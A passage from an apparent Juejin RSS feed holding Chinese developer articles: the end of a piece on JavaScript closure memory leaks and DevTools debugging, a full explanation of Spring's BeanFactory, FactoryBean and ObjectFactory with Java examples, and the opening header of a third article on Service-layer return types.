  <span class="hljs-keyword">const</span> heavyData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">'*'</span>); <span class="hljs-comment">// 大数据</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'I am keeping heavyData alive!'</span>);
    <span class="hljs-comment">// 虽然 inner 只用到了 console，但因为它在 outer 内部</span>
    <span class="hljs-comment">// 有些旧引擎可能会连带把 heavyData 一起保留在闭包上下文中</span>
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-8">如何防止呢？</h3>
<p>如果不幸遇到了页面越用越卡，怎么排查是不是内存泄露？</p>
<p><strong>Chrome DevTools 是你最好的排查工具：</strong></p>
<ol>
<li>
<p><strong>打开 Performance Monitor（性能监视器）：</strong></p>
<ul>
<li><code>F12</code> -&gt; <code>Esc</code> -&gt; 选择 <code>Performance monitor</code>。</li>
<li>盯着 <strong>JS 堆</strong> 和 <strong>DOM 节点</strong>。</li>
<li>如果你做过一遍 GC（点击 Memory 面板的小垃圾桶），这两个数值<strong>只增不减</strong>，恭喜你，漏了。</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/555e26dc29404827b8c2ca98775ad09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=Vxjqi3t6VOuxanWMrbuCiG%2FsNCQ%3D" alt="screenshot-20260113-115223.png" loading="lazy"/></p>
<ol>
<li>
<p><strong>Memory 面板抓快照：</strong></p>
<ul>
<li>录制 <strong>Heap Snapshot</strong>。</li>
<li>搜索 <code>Detached</code>，看看有没有红色的游离 DOM 节点。</li>
<li>或者对比两次快照（Allocation instrumentation on timeline），看看到底是哪个对象在疯狂增长。</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ff277c7919f4e74871d6c58a3d3d1f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=6F7Mla2SkPash%2FjMYYEhwBR%2BX7g%3D" alt="screenshot-20260113-115755.png" loading="lazy"/></p>
<hr/>
<p>那行让浏览器崩溃的代码，大家玩玩就好，<strong>千万别写到生产环境里</strong>（除非你渴望被运维提着刀追杀🤣）。</p>
<p>前端工程师的价值，不只是把页面画出来，更是要保证页面在<strong>长时间运行</strong>下依然丝滑。</p>
<p>下次再遇到页面卡顿，别光顾着怪网络慢，打开控制台看看，说不定是你写的某个内存泄漏代码正在悄悄吞噬用户的内存。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02c7df1509e947b1be0bbd9c68ff51dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=T61UzpSkI%2FhGjkbRYjfKzBDbbpA%3D" alt="谢谢大家.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory]]></title>    <link>https://juejin.cn/post/7594301878828498982</link>    <guid>https://juejin.cn/post/7594301878828498982</guid>    <pubDate>2026-01-13T01:23:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594301878828498982" data-draft-id="7592615536385458210" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory"/> <meta itemprop="keywords" content="后端,Spring,面试"/> <meta itemprop="datePublished" content="2026-01-13T01:23:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一旅人"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring 的西西弗斯之石：理解 BeanFactory、FactoryBean 与 ObjectFactory
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一旅人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:23:40.000Z" title="Tue Jan 13 2026 01:23:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天，代码又报错了。或者也许是昨天，我不清楚。
不管怎样，Spring 容器抛出了一个 <code>BeanCreationException</code>。为了解决它，我被迫潜入框架的深处，去注视那些平时被 <code>@Autowired</code> 掩盖的齿轮。</p>
<p>在 Spring 的世界里，存在着一种必然的复杂性。这种复杂性并非设计者的恶趣味，而是为了在一个静态的语言中构建动态世界所付出的代价。</p>
<p>在这个庞大的机器中，有三个名字极其相似的概念经常被混淆：<code>BeanFactory</code>、<code>FactoryBean</code> 和 <code>ObjectFactory</code>。这并不是命名的贫瘠，而是它们在本质上确实存在着微妙的纠缠。</p>
<p>今天，我们剥离掉那些花哨的比喻和无用的糖衣，用一种冷静的、近乎解剖学的视角，去审视这三个概念的本质。</p>
<hr/>
<h2 data-id="heading-0">一、BeanFactory：存在的容器</h2>
<p><strong>让我们首先纠正一个观念：BeanFactory 名为工厂，但其本质是容器（Container）。</strong></p>
<p>当我们谈论 Spring 容器时，我们实际上是在谈论 <code>BeanFactory</code>。它是 Spring IoC 容器的根接口，是整个世界的物理法则。</p>
<h3 data-id="heading-1">1.1 唯一的职责</h3>
<p>它的定义极其克制。它不关心业务逻辑，只关心一件事：<strong>管理对象的生命周期</strong>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BeanFactory</span> {
    Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> BeansException;
    &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name, Class&lt;T&gt; requiredType)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsBean</span><span class="hljs-params">(String name)</span>;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>当你启动一个 Spring Boot 应用时，<code>ApplicationContext</code> 就像一个充满活力的城市，而 <code>BeanFactory</code> 则是支撑这座城市的地下管网。所有的 BeanDefinition（关于 Bean 应该如何创建的蓝图）都注册在这里。</p>
<h3 data-id="heading-2">1.2 残酷的现实</h3>
<p>在大多数情况下，你不需要直接与 <code>BeanFactory</code> 对话。因为 <code>ApplicationContext</code> 已经为你封装好了一切。
但当你试图理解为什么你的 Bean 没有被正确初始化，或者为什么你的循环依赖失效时，你就必须意识到：<strong>你所有的 Bean，都只是 <code>BeanFactory</code> 中的 entries（条目）。</strong></p>
<p>它是一个巨大的 <code>Map&lt;String, BeanDefinition&gt;</code> 和 <code>Map&lt;String, Object&gt;</code> 的管理者。它冷酷无情，只按照定义的规则（Scope, Lazy, Dependence）来实例化对象。</p>
<hr/>
<h2 data-id="heading-3">二、FactoryBean：必要的欺骗</h2>
<p>如果说 <code>BeanFactory</code> 是宏观规则的制定者，那么 <code>FactoryBean</code> 就是微观规则的<strong>潜行者</strong>。</p>
<h3 data-id="heading-4">2.1 静态语言的困境</h3>
<p>想象这样一个场景：<strong>你需要注入一个接口的实现，但这个实现类并不存在于代码中，它是通过动态代理在运行时生成的。</strong>
这在 RPC 框架（如 Dubbo、Feign）和 ORM 框架（如 MyBatis）中极其常见。</p>
<p>你无法通过简单的 <code>&lt;bean class="..."&gt;</code> 或 <code>@Component</code> 来描述一个“不存在的类”。
这时候，你需要一个中间人。这个中间人表面上是一个普通的 Bean，但实际上，它是一个工厂。</p>
<h3 data-id="heading-5">2.2 伪装的艺术：以 MyBatis 为例</h3>
<p>为什么你只需要写一个 <code>UserMapper</code> 接口，就能直接 <code>@Autowired</code> 使用？
因为 Spring 容器里注册的那个 "userMapper" Bean，根本不是你的接口实现，而是一个 <code>MapperFactoryBean</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 简化的逻辑示意</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapperFactoryBean</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FactoryBean</span>&lt;T&gt; {
    
    <span class="hljs-keyword">private</span> Class&lt;T&gt; mapperInterface;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 往里跟进，最终这里发生了魔法：通过 JDK 动态代理生成接口的实</span>
        <span class="hljs-keyword">return</span> (T) Proxy.newProxyInstance(
            mapperInterface.getClassLoader(), 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] { mapperInterface }, 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapperProxy</span>&lt;&gt;()
        );
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Class&lt;?&gt; getObjectType() {
        <span class="hljs-keyword">return</span> mapperInterface;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSingleton</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h3 data-id="heading-6">2.3 这里的真相</h3>
<p>当容器调用 <code>getBean("userMapper")</code> 时，它发现这是一个 <code>FactoryBean</code>。于是，它不会返回 <code>FactoryBean</code> 实例本身，而是默默地调用 <code>getObject()</code>，并返回那个代理对象。</p>
<p>这就是欺骗。<strong>你以为你拿到了一个 Bean，其实你拿到的是 Bean 生产的产品。</strong></p>
<p>如果你渴望看到真相，看到那个操纵傀儡的幕后黑手，你需要在 Bean 名称前加上 <code>&amp;</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取的是 MapperProxy 代理对象</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">"userMapper"</span>); 

<span class="hljs-comment">// 获取的是 FactoryBean 工厂本身</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">"&amp;userMapper"</span>);
</code></pre>
<hr/>
<h2 data-id="heading-7">三、ObjectFactory：时间的延迟</h2>
<p><code>BeanFactory</code> 负责掌控空间（容器），<code>FactoryBean</code> 负责掌控构造（逻辑），而 <code>ObjectFactory</code> 则是为了掌控<strong>时间</strong>。</p>
<h3 data-id="heading-8">3.1 循环的死结</h3>
<p>在 Spring 的世界里，有一个经典的荒谬：A 需要 B，B 需要 A。
如果是构造器注入，只需坦然承认失败。但如果是 Setter 注入，Spring 试图挽救这种死结。</p>
<p>在 A 创建的过程中，需要注入 B。B 创建时，又需要注入 A。
此时 A 还在创建中，尚不是一个完整的 Bean。怎么办？
Spring 引入了三级缓存的概念。而第三级缓存，存放的就是一个 <code>ObjectFactory</code>。</p>
<h3 data-id="heading-9">3.2 回调的本质</h3>
<p><code>ObjectFactory</code> 在源码中简单得令人发指：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectFactory</span>&lt;T&gt; {
    T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> BeansException;
}
</code></pre>
<p>它只是一个<strong>函数式接口</strong>，一个回调。
它存在的意义在于：<strong>我现在不想要这个对象，但我想要一个“在未来某个时刻能获取这个对象”的能力。</strong></p>
<p>在循环依赖中，Spring 提前暴露了一个 <code>ObjectFactory</code>：</p>
<pre><code class="hljs language-java" lang="java">addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));
</code></pre>
<p>当 B 需要 A 时，它通过这个 <code>ObjectFactory</code> 拿到了 A 的早期引用（Early Reference）。尽管 A 还没完全初始化好，但 B 已经可以持有它的引用了。死结解开了。</p>
<h3 data-id="heading-10">3.3 作用域的错位</h3>
<p>另一个场景是：一个单例（Singleton）的 Service 需要使用一个 原型（Prototype）的 Bean。
如果你直接 <code>@Autowired</code>，原型的 Bean 只有在 Service 创建时被注入一次，之后也就是永远同一个对象了。这违背了原型的初衷。</p>
<p>如何解决？使用 <code>ObjectFactory</code> 延迟获取。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReportService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ObjectFactory&lt;ReportBuilder&gt; builderFactory;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generate</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 每次调用 getObject()，容器都会创建一个全新的 ReportBuilder</span>
        <span class="hljs-type">ReportBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> builderFactory.getObject();
        builder.build();
    }
}
</code></pre>
<p>在这里，<strong><code>ObjectFactory</code> 就像是一个通往容器的句柄，让你随时可以伸手进去拿一个新的对象，而不是守着陈旧的缓存。</strong></p>
<hr/>
<h2 data-id="heading-11">四、审判与裁决</h2>
<p>让我们在最后，用最客观的表格来审判这三者的区别。这不是为了背诵，而是为了理清混乱。</p>









































<table><thead><tr><th align="left">维度</th><th align="left">BeanFactory</th><th align="left">FactoryBean</th><th align="left">ObjectFactory</th></tr></thead><tbody><tr><td align="left"><strong>存在形式</strong></td><td align="left"><strong>容器</strong> (Container)</td><td align="left"><strong>Bean</strong> (Component)</td><td align="left"><strong>接口</strong> (Interface/Callback)</td></tr><tr><td align="left"><strong>底层逻辑</strong></td><td align="left"><code>ApplicationContext</code> 的父级接口 / <strong>宏观工厂</strong></td><td align="left">实现了 <code>FactoryBean</code> 接口的类 / <strong>微观工厂</strong></td><td align="left">函数式接口 / <strong>延迟回调</strong></td></tr><tr><td align="left"><strong>核心职责</strong></td><td align="left">管理所有 Bean 的生命周期</td><td align="left">此 Bean 负责<strong>生产</strong>另一个复杂的 Bean</td><td align="left">封装对象的创建过程，提供<strong>延迟</strong>获取能力</td></tr><tr><td align="left"><strong>获取方式</strong></td><td align="left"><code>ApplicationContext</code> 是它的超集</td><td align="left"><code>getBean("name")</code> 拿产品<br/><code>getBean("&amp;name")</code> 拿工厂</td><td align="left">注入 <code>ObjectFactory&lt;T&gt;</code> 后调用 <code>getObject()</code></td></tr><tr><td align="left"><strong>真实场景</strong></td><td align="left">Spring 框架的基石</td><td align="left">Mybatis <code>MapperFactoryBean</code>, <code>ProxyFactoryBean</code></td><td align="left">解决循环依赖(三级缓存), Scope(原型模式)适配</td></tr></tbody></table>
<h2 data-id="heading-12">五、结语</h2>
<p>在代码的荒原上，我们通过构建抽象来对抗混乱。</p>
<ul>
<li><strong>BeanFactory</strong> 是我们脚下的大地。<strong>它被称为工厂，但它实际是孕育万物的土壤（容器）。</strong></li>
<li><strong>FactoryBean</strong> 是我们手中的精密机床。<strong>它是一个特殊的 Bean，存在的目的却是为了制造另一个 Bean。</strong></li>
<li><strong>ObjectFactory</strong> 是我们预留的时间胶囊。<strong>它只是一个单纯的接口，为了应对循环与未来的不确定性。</strong></li>
</ul>
<p>理解它们，并不是为了通过面试，而是为了在下一次抛出异常时，你能冷静地凝视堆栈信息，知道机器的哪个齿轮发生了错位。</p>
<p>既然我们选择了与机器共舞，就必须理解机器的逻辑。这或许就是作为开发者的西西弗斯式命运——<strong>我们需要一次又一次地将巨石推向山顶，以此证明我们对这个庞大系统的掌控</strong>。</p>
<blockquote>
<p><strong>本文通过 AI 润色（加缪风格），试图以一种冷静、客观甚至存在主义的视角，去解构这些在日常 Coding 中被我们习以为常的概念。希望这种独特的叙事风格，能让你对这些枯燥的技术概念有更深刻的“存在感”。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么Java里面，Service 层不直接返回 Result 对象？]]></title>    <link>https://juejin.cn/post/7594817135128248354</link>    <guid>https://juejin.cn/post/7594817135128248354</guid>    <pubDate>2026-01-14T07:23:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128248354" data-draft-id="7594742976712474658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么Java里面，Service 层不直接返回 Result 对象？"/> <meta itemprop="keywords" content="Java,Spring Boot,面试"/> <meta itemprop="datePublished" content="2026-01-14T07:23:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只叫煤球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么Java里面，Service 层不直接返回 Result 对象？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只叫煤球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:23:00.000Z" title="Wed Jan 14 2026 07:23:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
